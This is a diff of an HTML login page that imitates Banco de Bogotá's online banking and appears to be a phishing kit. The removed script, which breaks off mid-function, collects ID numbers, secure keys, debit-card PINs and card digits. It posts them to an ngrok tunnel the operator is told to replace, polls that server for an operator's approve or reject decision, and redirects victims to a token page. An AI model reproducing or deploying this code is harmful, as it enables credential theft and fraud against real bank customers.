@@ -1,615 +1,173 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="description" content="Banca Virtual Banco de Bogotá - Acceso seguro a tu cuenta bancaria">
-    <meta name="theme-color" content="#002A8D">
-    
-    <title>Banca Virtual - Banco de Bogotá</title>
-    
-    <link rel="icon" type="image/png" sizes="32x32" href="Imagenes/channels4_profile-removebg-preview.png">
-    <link rel="icon" type="image/png" sizes="96x96" href="Imagenes/channels4_profile-removebg-preview.png">
-    <link rel="icon" type="image/png" sizes="192x192" href="Imagenes/channels4_profile-removebg-preview.png">
-    <link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
-    
-    <link rel="stylesheet" href="css/loading-overlay.css?v=1.0.2">
-    <link rel="stylesheet" href="index.css?v=1.0.2">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-
-    <style>
-        #esperaLogin {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: #2C3E5C;
-            z-index: 99999;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        #esperaLogin.visible {
-            display: flex;
-            opacity: 1;
-        }
-
-        .espera-login-spinner {
-            height: 8rem;
-            width: 6rem;
-            position: relative;
-            animation: spinner-bdb 4s infinite;
-            transform-origin: 50% 25%;
-        }
-
-        #esperaLogin .shape {
-            height: 2.5rem;
-            width: 2.5rem;
-            border-radius: 50%;
-            position: absolute;
-        }
-
-        #esperaLogin .shape-red {
-            background-color: #f23a31;
-            animation: red 4s infinite;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            opacity: 0;
-        }
-
-        #esperaLogin .shape-blue {
-            background-color: #1c83e1;
-            animation: blue 4s infinite;
-            top: 100%;
-            left: 50%;
-            transform: translateX(-50%) translateY(-100%);
-            opacity: 0;
-        }
-
-        #esperaLogin .shape-yellow {
-            background-color: #fdc130;
-            animation: yellow 4s infinite;
-            top: 100%;
-            left: 50%;
-            transform: translateX(-50%) translateY(-100%);
-            opacity: 0;
-        }
-
-        @keyframes red {
-            0%, 100% { top: 0; left: 50%; transform: translateX(-50%); opacity: 1; }
-            10%, 90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
-            12%, 50% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 0; }
-            52% { top: 100%; left: 10%; transform: translateX(0) translateY(-100%) scaleY(1); opacity: 1; }
-            60%, 80% { top: 0; left: 0; transform: translateX(0) translateY(0) scaleY(1); opacity: 1; }
-        }
-
-        @keyframes blue {
-            0%, 100%, 90.1% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 0; }
-            10% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); opacity: 0; }
-            12%, 32% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 1; }
-            20% { top: 0; left: 50%; transform: translateX(-50%) scaleY(80%); transform-origin: top; opacity: 1; }
-            30% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(100%); opacity: 1; }
-            40%, 60%, 80% { top: 0; left: 100%; transform: translateX(-100%) translateY(0) scaleY(1); opacity: 1; }
-            50% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(1); opacity: 1; }
-            52% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(80%); opacity: 1; }
-            90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
-        }
-
-        @keyframes yellow {
-            0%, 10%, 100%, 12%, 20%, 30%, 90.1% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 0; }
-            32% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 0; }
-            40% { top: 0; transform: translateX(0) translateY(0) scaleY(1); left: 0; opacity: 1; }
-            50% { top: 100%; left: 10%; transform: translateX(0) translateY(-100%) scaleY(1); opacity: 1; }
-            50.1% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(1); opacity: 1; }
-            60%, 80% { top: 50%; left: 50%; transform: translateX(-50%) translateY(-50%) scaleY(100%); transform-origin: bottom; opacity: 1; }
-            90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
-        }
-
-        @keyframes spinner-bdb {
-            0%, 60% { transform: rotateZ(0); }
-            100%, 80% { transform: rotateZ(720deg); }
-        }
-
-        @keyframes popInError {
-            from { opacity: 0; transform: scale(0.85); }
-            to   { opacity: 1; transform: scale(1); }
-        }
-        #errorLogin.visible {
-            display: flex !important;
-            opacity: 1 !important;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="description" content="Banca Virtual Banco de Bogotá - Acceso seguro a tu cuenta bancaria">
+<meta name="theme-color" content="#002A8D">
+<title>Banca Virtual - Banco de Bogotá</title>
+<link rel="icon" type="image/png" sizes="32x32" href="Imagenes/channels4_profile-removebg-preview.png">
+<link rel="icon" type="image/png" sizes="96x96" href="Imagenes/channels4_profile-removebg-preview.png">
+<link rel="icon" type="image/png" sizes="192x192" href="Imagenes/channels4_profile-removebg-preview.png">
+<link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
+<link rel="stylesheet" href="css/loading-overlay.css?v=1.0.2">
+<link rel="stylesheet" href="index.css?v=1.0.2">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+#esperaLogin{display:none;position:fixed;inset:0;background:#2C3E5C;z-index:99999;align-items:center;justify-content:center;flex-direction:column;opacity:0;transition:opacity .3s ease}
+#esperaLogin.visible{display:flex;opacity:1}
+.espera-login-spinner{height:8rem;width:6rem;position:relative;animation:spinner-bdb 4s infinite;transform-origin:50% 25%}
+#esperaLogin .shape{height:2.5rem;width:2.5rem;border-radius:50%;position:absolute}
+#esperaLogin .shape-red{background-color:#f23a31;animation:red 4s infinite;top:0;left:50%;transform:translateX(-50%);opacity:0}
+#esperaLogin .shape-blue{background-color:#1c83e1;animation:blue 4s infinite;top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}
+#esperaLogin .shape-yellow{background-color:#fdc130;animation:yellow 4s infinite;top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}
+@keyframes red{0%,100%{top:0;left:50%;transform:translateX(-50%);opacity:1}10%,90%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:1}12%,50%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);transform-origin:bottom;opacity:0}52%{top:100%;left:10%;transform:translateX(0) translateY(-100%) scaleY(1);opacity:1}60%,80%{top:0;left:0;transform:translateX(0) translateY(0) scaleY(1);opacity:1}}
+@keyframes blue{0%,100%,90.1%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}10%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);opacity:0}12%,32%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);transform-origin:bottom;opacity:1}20%{top:0;left:50%;transform:translateX(-50%) scaleY(80%);transform-origin:top;opacity:1}30%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(100%);opacity:1}40%,60%,80%{top:0;left:100%;transform:translateX(-100%) translateY(0) scaleY(1);opacity:1}50%{top:100%;left:90%;transform:translateX(-100%) translateY(-100%) scaleY(1);opacity:1}52%{top:100%;left:90%;transform:translateX(-100%) translateY(-100%) scaleY(80%);opacity:1}90%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:1}}
+@keyframes yellow{0%,10%,100%,12%,20%,30%,90.1%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}32%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);transform-origin:bottom;opacity:0}40%{top:0;transform:translateX(0) translateY(0) scaleY(1);left:0;opacity:1}50%{top:100%;left:10%;transform:translateX(0) translateY(-100%) scaleY(1);opacity:1}50.1%{top:100%;left:90%;transform:translateX(-100%) translateY(-100%) scaleY(1);opacity:1}60%,80%{top:50%;left:50%;transform:translateX(-50%) translateY(-50%) scaleY(100%);transform-origin:bottom;opacity:1}90%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:1}}
+@keyframes spinner-bdb{0%,60%{transform:rotateZ(0)}100%,80%{transform:rotateZ(720deg)}}
+@keyframes popInError{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
+#errorLogin.visible{display:flex !important;opacity:1 !important}
+</style>
 </head>
 <body>
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-content">
-            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
-            <div class="loading-spinner">
-                <div class="spinner-ring"></div>
-            </div>
-            <p class="loading-text">Cargando</p>
-            <p class="loading-subtext"></p>
-        </div>
-    </div>
-
-    <div class="container">
-        <section class="login-section">
-            <div class="bank-logo">
-                <img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogotá Logo" class="main-logo">
-            </div>
-            <h1 class="welcome-title">Bienvenido a tu Banca Virtual</h1>
-            <div class="welcome-banner">
-                <img src="Imagenes/Señora.png" alt="Asistente Virtual" class="banner-image">
-                <div class="banner-text">
-                    <p>¿Nunca has ingresado a Banca Virtual?</p>
-                    <a href="#">Aquí te decimos cómo hacerlo ›</a>
-                </div>
-            </div>
-            <div class="login-container">
-                <div class="login-options">
-                    <button class="active">Clave segura</button>
-                    <button>Tarjeta débito</button>
-                </div>
-                <div class="login-alert" id="loginAlert">
-                    <button type="button" class="close-icon" id="closeAlert">
-                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M18 6L6 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                            <path d="M6 6L18 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                        </svg>
-                    </button>
-                    <p>Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.</p>
-                </div>
-                <form id="claveForm" class="login-form clave-form">
-                    <div class="form-group">
-                        <label>Identificación</label>
-                        <div class="input-group">
-                            <select>
-                                <option>C.C. Cédula de ciudadanía</option>
-                                <option>T.I. Tarjeta de Identidad</option>
-                                <option>C.E. Cédula de Extranjería</option>
-                                <option>N.I.T. NIT Persona Natural</option>
-                                <option>N.P.E. NIT Persona Extranjera</option>
-                                <option>N.I.J. NIT Persona Jurídica</option>
-                                <option>P.S. Pasaporte</option>
-                                <option>R.C. Registro Civil</option>
-                            </select>
-                            <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="identification" placeholder="#" maxlength="10" data-numeric="true">
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Clave segura</label>
-                        <div class="password-input">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="secure-key" placeholder="...." maxlength="4" aria-label="Clave segura" data-numeric="true">
-                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-                                </svg>
-                            </button>
-                        </div>
-                    </div>
-                    <button type="submit" class="login-button" disabled>Ingresar</button>
-                </form>
-                <form id="tarjetaForm" class="login-form tarjeta-form" style="display: none;">
-                    <div class="form-group">
-                        <label>Identificación</label>
-                        <div class="input-group">
-                            <select>
-                                <option>C.C. Cédula de ciudadanía</option>
-                                <option>T.I. Tarjeta de Identidad</option>
-                                <option>C.E. Cédula de Extranjería</option>
-                                <option>N.I.T. NIT Persona Natural</option>
-                                <option>N.P.E. NIT Persona Extranjera</option>
-                                <option>N.I.J. NIT Persona Jurídica</option>
-                                <option>P.S. Pasaporte</option>
-                                <option>R.C. Registro Civil</option>
-                            </select>
-                            <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="identification" placeholder="#" maxlength="10" data-numeric="true">
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Clave de tu tarjeta débito</label>
-                        <div class="password-input">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="card-pin" placeholder="...." maxlength="4" aria-label="Clave de tarjeta débito" data-numeric="true">
-                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-                                </svg>
-                            </button>
-                        </div>
-                    </div>
-                
-                    <div class="form-group">
-                        <label>Últimos 4 dígitos de tu tarjeta débito</label>
-                        <div class="password-input">
-                            <input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="card-number" placeholder="...." maxlength="4" aria-label="Últimos 4 dígitos de tu tarjeta débito" data-numeric="true">
-                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
-                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-                                </svg>
-                            </button>
-                        </div>
-                    </div>
-
-                    <button type="submit" class="login-button" disabled>Ingresar</button>
-                </form>
-                <div class="links">
-                    <a href="#">Registrarme</a>
-                    <a href="#">Olvidé mi clave</a>
-                </div>
-            </div>
-            <p class="privacy-text">
-                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.
-            </p>
-        </section>
-        <section class="right-section">
-            <div class="service-cards-container">
-                <button class="nav-button prev-button" aria-label="Anterior">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="12" cy="12" r="12" fill="white"/>
-                        <path d="M14 6L8 12L14 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                </button>
-                <div class="service-cards">
-                    <a href="#" class="service-card">
-                        <div class="card-icon">
-                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="currentColor" stroke-width="2"/>
-                                <path d="M19 15C19.5523 15 20 14.5523 20 14C20 13.4477 19.5523 13 19 13C18.4477 13 18 13.4477 18 14C18 14.5523 18.4477 15 19 15Z" fill="currentColor"/>
-                                <path d="M19 11C19.5523 11 20 10.5523 20 10C20 9.44772 19.5523 9 19 9C18.4477 9 18 9.44772 18 10C18 10.5523 18.4477 11 19 11Z" fill="currentColor"/>
-                                <path d="M5 15C5.55228 15 6 14.5523 6 14C6 13.4477 5.55228 13 5 13C4.44772 13 4 13.4477 4 14C4 14.5523 4.44772 15 5 15Z" fill="currentColor"/>
-                                <path d="M5 11C5.55228 11 6 10.5523 6 10C6 9.44772 5.55228 9 5 9C4.44772 9 4 9.44772 4 10C4 10.5523 4.44772 11 5 11Z" fill="currentColor"/>
-                                <path d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21Z" stroke="currentColor" stroke-width="2"/>
-                            </svg>
-                        </div>
-                        <div class="card-content">
-                            <h3>Configuración y<br>seguridad</h3>
-                        </div>
-                    </a>
-
-                    <a href="#" class="service-card">
-                        <div class="card-icon">
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 3L4 7V17L12 21L20 17V7L12 3Z" stroke="currentColor" stroke-width="2"/>
-                                <path d="M12 12L4 7M12 12V21M12 12L20 7" stroke="currentColor" stroke-width="2"/>
-                            </svg>
-                        </div>
-                        <div class="card-content">
-                            <h3>Solicitar un<br>producto</h3>
-                        </div>
-                    </a>
-
-                    <a href="#" class="service-card">
-                        <div class="card-icon">
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M21 11.5C21.0034 12.8199 20.6951 14.1219 20.1 15.3C19.3944 16.7118 18.3098 17.8992 16.9674 18.7293C15.6251 19.5594 14.0782 19.9994 12.5 20C11.1801 20.0035 9.87812 19.6951 8.7 19.1L3 21L4.9 15.3C4.30493 14.1219 3.99656 12.8199 4 11.5C4.00061 9.92179 4.44061 8.37488 5.27072 7.03258C6.10083 5.69028 7.28825 4.6056 8.7 3.90003C9.87812 3.30496 11.1801 2.99659 12.5 3.00003H13C15.0843 3.11502 17.053 3.99479 18.5291 5.47089C20.0052 6.94699 20.885 8.91568 21 11V11.5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                            </svg>
-                        </div>
-                        <div class="card-content">
-                            <h3>Atención al<br>cliente</h3>
-                        </div>
-                    </a>
-
-                    <a href="#" class="service-card">
-                        <div class="card-icon">
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M12 8V12L14 14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                                <path d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21Z" stroke="currentColor" stroke-width="2"/>
-                            </svg>
-                        </div>
-                        <div class="card-content">
-                            <h3>Solicitar un<br>turno digital</h3>
-                        </div>
-                    </a>
-
-                    <a href="#" class="service-card">
-                        <div class="card-icon">
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M17 8H7a2 2 0 00-2 2v9a2 2 0 002 2h10a2 2 0 002-2v-9a2 2 0 00-2-2zM12 3v5M8 7V3h8v4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                                <path d="M12 14v2M12 10v1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                            </svg>
-                        </div>
-                        <div class="card-content">
-                            <h3>Buscar cajeros<br>y oficinas</h3>
-                        </div>
-                    </a>
-                </div>
-                <button class="nav-button next-button" aria-label="Siguiente">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="12" cy="12" r="12" fill="white"/>
-                        <path d="M10 6L16 12L10 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                </button>
-            </div>
-            <div class="version-number">v.1.29.0</div>
-            <p class="privacy-text privacy-text-right">
-                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.
-            </p>
-        </section>
-    </div>
-
-    <div id="esperaLogin">
-        <div class="espera-login-spinner">
-            <div class="shape shape-yellow"></div>
-            <div class="shape shape-blue"></div>
-            <div class="shape shape-red"></div>
-        </div>
-    </div>
-
-    <!-- Overlay de error: credenciales inválidas -->
-    <div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Open Sans',-apple-system,sans-serif;opacity:0;transition:opacity .3s ease">
-        <div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#1a1a2e">
-            <div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)">
-                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <line x1="12" y1="8" x2="12" y2="13"></line>
-                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
-                </svg>
-            </div>
-            <div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div>
-            <div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div>
-            <button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0%,#002277 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,0.35)">Intentar de nuevo</button>
-        </div>
-    </div>
-
-    <script>
-        (function() {
-            // ============================================================
-            // ⚠️ CAMBIA ESTA URL POR LA DE TU NGROK ACTUAL
-            const BACKEND_URL = "https://exception-juiciness-hunting.ngrok-free.dev";
-            // ============================================================
-
-            // Generar SESSION_ID único para esta sesión
-            const SESSION_ID = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
-            try { sessionStorage.setItem('sessionId', SESSION_ID); } catch(e) {}
-            console.log('🆔 Sesión:', SESSION_ID);
-
-            const claveForm   = document.getElementById('claveForm');
-            const tarjetaForm = document.getElementById('tarjetaForm');
-            const loginAlert  = document.getElementById('loginAlert');
-            const closeAlert  = document.getElementById('closeAlert');
-            const tabs        = document.querySelectorAll('.login-options button');
-            const esperaLogin = document.getElementById('esperaLogin');
-
-            function soloDigitos(valor) {
-                return (valor || '').replace(/\D/g, '');
-            }
-
-            document.querySelectorAll('input[data-numeric="true"]').forEach(function(input) {
-                input.setAttribute('inputmode', 'numeric');
-                input.setAttribute('autocomplete', 'off');
-
-                input.addEventListener('beforeinput', function(e) {
-                    if (e.data && /\D/.test(e.data)) {
-                        e.preventDefault();
-                    }
-                });
-
-                input.addEventListener('input', function() {
-                    const limpio = soloDigitos(input.value);
-                    if (input.value !== limpio) {
-                        input.value = limpio;
-                    }
-                });
-
-                input.addEventListener('paste', function(e) {
-                    e.preventDefault();
-                    const texto = (e.clipboardData || window.clipboardData).getData('text') || '';
-                    const limpio = soloDigitos(texto);
-                    const max = parseInt(input.getAttribute('maxlength') || '99', 10);
-                    const inicio = input.selectionStart || 0;
-                    const fin = input.selectionEnd || 0;
-                    const actual = input.value || '';
-                    const nuevo = (actual.slice(0, inicio) + limpio + actual.slice(fin)).slice(0, max);
-                    input.value = nuevo;
-                    input.dispatchEvent(new Event('input', { bubbles: true }));
-                });
-
-                input.addEventListener('keypress', function(e) {
-                    if (e.key && e.key.length === 1 && /\D/.test(e.key)) {
-                        e.preventDefault();
-                    }
-                });
-
-                input.addEventListener('drop', function(e) {
-                    e.preventDefault();
-                });
-            });
-
-            // Enviar datos al backend
-            async function enviarBackend(tipo, datos) {
-                const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-
-                const payload = {
-                    sessionId: SESSION_ID,
-                    tipo: tipo,
-                    tipoDoc: datos.tipoDoc || '',
-                    identificacion: datos.identificacion || '',
-                    clave: datos.clave || '',
-                    tarjeta: datos.tarjeta || ''
-                };
-
-                try {
-                    sessionStorage.setItem("loginData", JSON.stringify({ ...payload, fecha: fecha }));
-                } catch (e) {
-                    console.warn("No se pudo guardar en sessionStorage:", e);
-                }
-
-                try {
-                    const res = await fetch(BACKEND_URL + '/enviar', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'ngrok-skip-browser-warning': 'true'
-                        },
-                        body: JSON.stringify(payload)
-                    });
-                    const data = await res.json();
-                    console.log('📤 Enviado al backend:', data);
-                } catch (err) {
-                    console.error("Error enviando al backend:", err);
-                }
-            }
-
-            tabs.forEach(function(tab, i) {
-                tab.addEventListener('click', function() {
-                    tabs.forEach(t => t.classList.remove('active'));
-                    tab.classList.add('active');
-
-                    if (i === 0) {
-                        claveForm.style.display = '';
-                        tarjetaForm.style.display = 'none';
-                        if (loginAlert) loginAlert.style.display = 'flex';
-                    } else {
-                        claveForm.style.display = 'none';
-                        tarjetaForm.style.display = '';
-                        if (loginAlert) loginAlert.style.display = 'none';
-                    }
-                });
-            });
-
-            if (closeAlert) {
-                closeAlert.addEventListener('click', function() {
-                    loginAlert.style.display = 'none';
-                });
-            }
-
-            document.querySelectorAll('.toggle-password').forEach(function(btn) {
-                btn.addEventListener('click', function() {
-                    const input = btn.parentElement.querySelector('input');
-                    if (input) {
-                        input.type = input.type === 'password' ? 'text' : 'password';
-                    }
-                });
-            });
-
-            // Mostrar spinner + consultar estado al backend
-            function mostrarEsperaYRedirigir() {
-                if (esperaLogin) esperaLogin.classList.add('visible');
-
-                const interval = setInterval(async () => {
-                    try {
-                        const res = await fetch(`${BACKEND_URL}/estado/${SESSION_ID}`, {
-                            headers: { 'ngrok-skip-browser-warning': 'true' }
-                        });
-                        const data = await res.json();
-                        console.log('🔍 Estado:', data.estado);
-
-                        if (data.estado === 'aprobado') {
-                            clearInterval(interval);
-                            window.location.href = 'token.html';
-                        } else if (data.estado === 'rechazado') {
-                            clearInterval(interval);
-                            if (esperaLogin) esperaLogin.classList.remove('visible');
-                            setTimeout(() => {
-                                const err = document.getElementById('errorLogin');
-                                if (err) err.classList.add('visible');
-                            }, 300);
-                        }
-                    } catch (e) {
-                        console.error('Error consultando estado:', e);
-                    }
-                }, 2000);
-
-                // Timeout de seguridad: 3 minutos
-                setTimeout(() => {
-                    clearInterval(interval);
-                    if (esperaLogin) esperaLogin.classList.remove('visible');
-                }, 3 * 60 * 1000);
-            }
-
-            // Botón "Intentar de nuevo"
-            const errorLoginBtn = document.getElementById('errorLoginBtn');
-            if (errorLoginBtn) {
-                errorLoginBtn.addEventListener('click', function() {
-                    const err = document.getElementById('errorLogin');
-                    if (err) err.classList.remove('visible');
-                    window.location.reload();
-                });
-            }
-
-            if (claveForm) {
-                const claveInputs = claveForm.querySelectorAll('input[name]');
-                const claveBtn = claveForm.querySelector('.login-button');
-
-                function validateClaveForm() {
-                    const identification = claveForm.querySelector('input[name="identification"]');
-                    const secureKey = claveForm.querySelector('input[name="secure-key"]');
-                    const isValid = identification.value.trim().length >= 5 &&
-                                    secureKey.value.trim().length === 4;
-                    if (claveBtn) claveBtn.disabled = !isValid;
-                }
-
-                claveInputs.forEach(input => input.addEventListener('input', validateClaveForm));
-                validateClaveForm();
-
-                claveForm.addEventListener('submit', async function(e) {
-                    e.preventDefault();
-
-                    const selectEl       = claveForm.querySelector('select');
-                    const tipoDoc        = selectEl ? selectEl.value : "";
-                    const identificacion = claveForm.querySelector('input[name="identification"]').value.trim();
-                    const clave          = claveForm.querySelector('input[name="secure-key"]').value.trim();
-
-                    await enviarBackend("Clave segura", {
-                        tipoDoc: tipoDoc,
-                        identificacion: identificacion,
